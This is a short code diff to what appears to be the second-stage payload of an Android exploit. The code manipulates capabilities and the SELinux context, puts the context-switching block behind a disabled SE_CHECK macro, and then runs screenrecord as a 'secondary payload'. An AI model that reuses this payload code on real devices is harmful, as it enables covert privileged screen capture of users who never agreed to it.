@@ -32,6 +32,8 @@
 #define DEBUGPRINT(...)
 #endif
 
+//#define SE_CHECK
+
 int main(int __unused argc, char __unused **argv)
 {
   struct __user_cap_header_struct capheader;
@@ -63,6 +65,7 @@ int main(int __unused argc, char __unused **argv)
     return -2;
   }
 
+#ifdef SE_CHECK
   char *orig_ctx_str = NULL;
   char *ctx_str = NULL;
   context_t ctx = NULL;
@@ -94,6 +97,7 @@ int main(int __unused argc, char __unused **argv)
     DEBUGPRINT("Error setting context: %s\n", strerror(errno));
     return -3;
   }
+#endif
 
   DEBUGPRINT("Executing secondary payload\n");
   int ret = execlp("/system/bin/screenrecord", "screenrecord", NULL);
